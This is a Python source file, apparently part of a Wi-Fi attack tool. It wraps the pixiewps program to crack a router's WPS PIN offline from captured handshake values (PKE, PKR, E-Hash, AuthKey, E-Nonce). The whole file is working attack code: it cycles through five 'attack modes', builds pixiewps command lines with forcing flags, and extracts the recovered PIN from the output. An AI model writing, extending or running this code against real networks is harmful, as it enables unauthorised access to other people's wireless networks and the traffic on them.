import subprocess
import time
import os

class Data:
    """Stored data used for pixiewps command."""

    def __init__(self):
        self.PKE = ''
        self.PKR = ''
        self.E_HASH1 = ''
        self.E_HASH2 = ''
        self.AUTHKEY = ''
        self.E_NONCE = ''
        self.MAX_TIMEOUT = 60  # Maximum timeout for pixiewps execution
        self.ATTACK_MODES = ['1', '2', '3', '4', '5']  # Different pixie attack modes
        self.CURRENT_MODE = '1'  # Default attack mode

    def getAll(self):
        """Output all pixiewps related variables."""
        return (self.PKE and self.PKR and self.E_NONCE and self.AUTHKEY
                and self.E_HASH1 and self.E_HASH2)

    def runPixieWps(self, show_command: bool = False, full_range: bool = False) -> str | bool:
        """Runs the pixiewps with enhanced attack modes and error handling."""
        print('[*] Running Pixiewps with enhanced attack modes...')
        
        for mode in self.ATTACK_MODES:
            self.CURRENT_MODE = mode
            print(f'[*] Trying attack mode {mode}...')
            
            command = self._getPixieCmd(full_range)
            if show_command:
                print(' '.join(command))

            try:
                command_output = subprocess.run(
                    command,
                    encoding='utf-8',
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    timeout=self.MAX_TIMEOUT
                )

                if command_output.returncode == 0:
                    print(command_output.stdout)
                    lines = command_output.stdout.splitlines()
                    for line in lines:
                        if ('[+]' in line) and ('WPS pin' in line):
                            pin = line.split(':')[-1].strip()
                            if pin == '<empty>':
                                pin = '\'\''
                            print(f'[+] Successfully found PIN using mode {mode}')
                            return pin
                else:
                    print(f'[-] Attack mode {mode} failed')
                    
            except subprocess.TimeoutExpired:
                print(f'[-] Attack mode {mode} timed out after {self.MAX_TIMEOUT} seconds')
                continue
            except Exception as e:
                print(f'[-] Error in attack mode {mode}: {str(e)}')
                continue

            # Small delay between attack modes
            time.sleep(1)

        print('[-] All attack modes failed')
        return False

    def _getPixieCmd(self, full_range: bool = False) -> list[str]:
        """Generates an enhanced command list for the pixiewps tool."""
        pixiecmd = ['pixiewps']
        pixiecmd.extend([
            '--pke', self.PKE,
            '--pkr', self.PKR,
            '--e-hash1', self.E_HASH1,
            '--e-hash2', self.E_HASH2,
            '--authkey', self.AUTHKEY,
            '--e-nonce', self.E_NONCE,
            '--mode', self.CURRENT_MODE  # Add attack mode
        ])

        if full_range:
            pixiecmd.append('--force')

        # Add additional optimization flags based on mode
        if self.CURRENT_MODE in ['1', '3']:
            pixiecmd.append('--dh-small')  # Use small DH keys for faster computation
        
        # Add verbosity for debugging
        if os.environ.get('PIXIE_DEBUG'):
            pixiecmd.append('-v')

        return pixiecmd

    def clear(self):
        """Resets the pixiewps variables while preserving settings."""
        temp_timeout = self.MAX_TIMEOUT
        temp_mode = self.CURRENT_MODE
        self.__init__()
        self.MAX_TIMEOUT = temp_timeout
        self.CURRENT_MODE = temp_mode
